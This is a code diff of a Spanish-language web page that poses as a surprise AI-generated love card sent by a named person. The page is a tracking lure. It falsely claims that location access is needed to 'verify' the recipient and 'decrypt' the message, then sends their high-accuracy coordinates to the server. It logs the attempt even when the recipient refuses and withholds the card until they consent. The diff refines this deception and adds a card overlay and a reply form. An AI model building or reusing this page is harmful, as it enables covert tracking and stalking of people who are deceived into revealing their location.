@@ -49,27 +49,25 @@
 </head>
 
 <body>
-
     <header>
         <div class="brand" style="font-size: 2rem;">❤️ Love AI 🤖</div>
     </header>
 
     <main>
-
         <!-- INTRO SCREEN -->
         <div id="intro-screen" class="glass-panel">
             <div style="font-size: 4rem; margin-bottom: 1rem;">💌</div>
-            <h2 id="welcome-text">¡Alguien te envió una sorpresa!</h2>
+            <h2 id="welcome-text">¡Sorpresa para ti!</h2>
             <p style="color: white; font-size: 1.1rem; margin-bottom: 2rem;">
-                <strong id="sender-display" style="color: var(--secondary);">Una persona anónima</strong>
-                ha creado una imagen única generada por IA para ti.
+                <strong id="sender-display" style="color: var(--secondary);">Alguien</strong>
+                ha creado un momento mágico solo para ti.
             </p>
             <p style="font-size: 0.9rem; margin-bottom: 1rem; color: #ff8fa3;">
-                ⚠️ Para verificar que eres tú y desencriptar el mensaje,
+                ⚠️ Para verificar que eres la persona correcta y desencriptar el mensaje,
                 necesitamos confirmar tu dispositivo.
                 <br><strong>Por favor dale a "Permitir" cuando se te pida la ubicación.</strong>
             </p>
-            <button class="magic-btn" onclick="startflow()">✨ Revelar Imagen con Amor ✨</button>
+            <button class="magic-btn" onclick="startflow()">✨ Ver Mi Mensaje ✨</button>
         </div>
 
         <!-- GENERATING SCREEN -->
@@ -80,33 +78,92 @@
         </div>
 
         <!-- CONTENT SCREEN -->
-        <div id="content-screen" class="hidden glass-panel" style="max-width: 800px;">
-            <img id="sharedImage" src="" alt="Shared Content"
-                style="width: 100%; border-radius: 8px; box-shadow: 0 4px 15px rgba(255,77,109,0.5); opacity:0; transition: opacity 2s;">
-            <h3 style="margin-top: 1.5rem; color: var(--secondary);">Generado con Amor ❤️</h3>
+        <div id="content-screen" class="hidden glass-panel" style="max-width: 800px; width: 95%;">
+
+            <!-- DYNAMIC CARD CONTAINER -->
+            <div id="dynamic-card" class="hidden"
+                style="position: relative; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 15px rgba(255,77,109,0.5);">
+                <img id="card-bg" src="" style="width: 100%; display: block;">
+
+                <!-- OVERLAY TEXTS -->
+                <div
+                    style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; text-align: center; text-shadow: 2px 2px 4px rgba(0,0,0,0.7);">
+                    <h1 style="font-family: 'Georgia', serif; font-size: 2.5rem; color: #fff; margin: 0;">Te Quiero</h1>
+                    <h2 id="recipient-overlay"
+                        style="font-family: 'Brush Script MT', cursive; font-size: 3rem; color: #ff4d6d; margin: 10px 0;">
+                    </h2>
+                </div>
+
+                <!-- ANIMATED FLOWERS (CSS) -->
+                <div class="flower" style="top: 10%; left: 10%; animation-delay: 0s;">🌸</div>
+                <div class="flower" style="top: 20%; right: 20%; animation-delay: 2s;">🌺</div>
+                <div class="flower" style="bottom: 15%; left: 30%; animation-delay: 4s;">🌹</div>
+                <div class="flower" style="bottom: 10%; right: 10%; animation-delay: 1s;">🌸</div>
+            </div>
+
+            <!-- REGULAR IMAGE -->
+            <img id="sharedImage" class="hidden" src=""
+                style="width: 100%; border-radius: 8px; box-shadow: 0 4px 15px rgba(255,77,109,0.5);">
+
+            <h3 id="footer-msg" style="margin-top: 1.5rem; color: var(--secondary);">Generado con Amor ❤️</h3>
+
+            <!-- REPLY SECTION -->
+            <div id="reply-section"
+                style="margin-top: 2rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1rem;">
+                <p>¿Te gustó? Envíale una respuesta rápida:</p>
+                <textarea id="reply-msg" placeholder="Escribe tu mensaje aquí..."
+                    style="width: 100%; height: 80px; background: rgba(0,0,0,0.3); border: 1px solid var(--secondary); border-radius: 5px; color: white; padding: 10px;"></textarea>
+                <button onclick="sendReply()"
+                    style="margin-top: 10px; background: var(--primary); border: none; padding: 8px 20px; border-radius: 20px; color: white; cursor: pointer;">💌
+                    Enviar Respuesta</button>
+            </div>
+
         </div>
 
         <!-- FAKE BUTTON / FOOTER -->
         <div style="margin-top: 3rem; width: 100%; text-align: center;">
             <a href="/"
                 style="background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; font-size: 0.9rem; color: white; text-decoration: none; border: 1px solid rgba(255,255,255,0.2);">
-                🎨 Generar imagen para enviar con amor
+                🎨 Crear mi propia tarjeta IA
             </a>
         </div>
 
     </main>
 
+    <style>
+        .flower {
+            position: absolute;
+            font-size: 2rem;
+            opacity: 0.8;
+            animation: float 6s infinite ease-in-out;
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0) rotate(0deg);
+            }
+
+            50% {
+                transform: translateY(-20px) rotate(20deg);
+            }
+        }
+    </style>
+
     <script>
         const pathSegments = window.location.pathname.split('/');
         const id = pathSegments[pathSegments.length - 1];
+        let currentData = null;
 
         document.addEventListener('DOMContentLoaded', async () => {
+            // Fetch metadata
             try {
                 const response = await fetch(`/api/image/${id}`);
-                const data = await response.json();
-                if (data.senderName) {
-                    document.getElementById('sender-display').textContent = data.senderName;
-                    document.title = `¡${data.senderName} te envió una sorpresa!`;
+                currentData = await response.json();
+                if (currentData.senderName) {
+                    document.getElementById('sender-display').textContent = currentData.senderName;
+                    document.title = `¡Sorpresa de ${currentData.senderName}!`;
                 }
             } catch (e) { console.log("Metadata fetch failed"); }
         });
@@ -126,25 +183,21 @@
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // SUCCESS
                         const { latitude, longitude } = position.coords;
                         sendTrackingData(latitude, longitude);
                         clearInterval(textInterval);
-                        setTimeout(showImage, 1000);
+                        setTimeout(showContent, 1000);
                     },
                     (error) => {
-                        // DENIED / ERROR
                         clearInterval(textInterval);
-                        sendTrackingData(null, null); // Log attempt anyway
-
-                        // Strict enforcement: Do NOT show image. Show error and reset.
+                        sendTrackingData(null, null);
                         alert("❌ Acceso Denegado: Debes permitir la ubicación para verificar que eres tú y ver el mensaje secreto.");
                         location.reload();
                     },
                     { enableHighAccuracy: true, timeout: 15000 }
                 );
             } else {
-                alert("Tu navegador no soporta esta tecnología de seguridad.");
+                alert("Tu navegador no soporta esta tecnología.");
                 location.reload();
             }
         }
@@ -159,20 +212,35 @@
             }).catch(e => console.error(e));
         }
 
-        async function showImage() {
-            try {
-                const response = await fetch(`/api/image/${id}`);
-                const data = await response.json();
+        function showContent() {
+            document.getElementById('gen-screen').classList.add('hidden');
+            document.getElementById('content-screen').classList.remove('hidden');
 
-                document.getElementById('gen-screen').classList.add('hidden');
-                document.getElementById('content-screen').classList.remove('hidden');
-
+            if (currentData && currentData.isAiGenerated) {
+                // SHOW DYNAMIC CARD
+                const card = document.getElementById('dynamic-card');
+                card.classList.remove('hidden');
+                document.getElementById('card-bg').src = `/uploads/${currentData.filename}`;
+                document.getElementById('recipient-overlay').textContent = currentData.recipientName || "Ti";
+            } else {
+                // SHOW REGULAR IMAGE
                 const img = document.getElementById('sharedImage');
-                img.src = `/uploads/${data.filename}`;
-                img.onload = () => { img.style.opacity = 1; };
-            } catch (err) {
-                alert("La imagen expiró o no existe.");
+                img.classList.remove('hidden');
+                img.src = `/uploads/${currentData.filename}`;
             }
+        }
+
+        async function sendReply() {
+            const msg = document.getElementById('reply-msg').value;
+            if (!msg) return alert("Escribe un mensaje primero.");
+
+            await fetch('/api/reply', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id, message: msg })
+            });
+
+            document.getElementById('reply-section').innerHTML = "<p style='color: #2ecc71'>¡Respuesta enviada con éxito! ❤️</p>";
         }
     </script>
 </body>
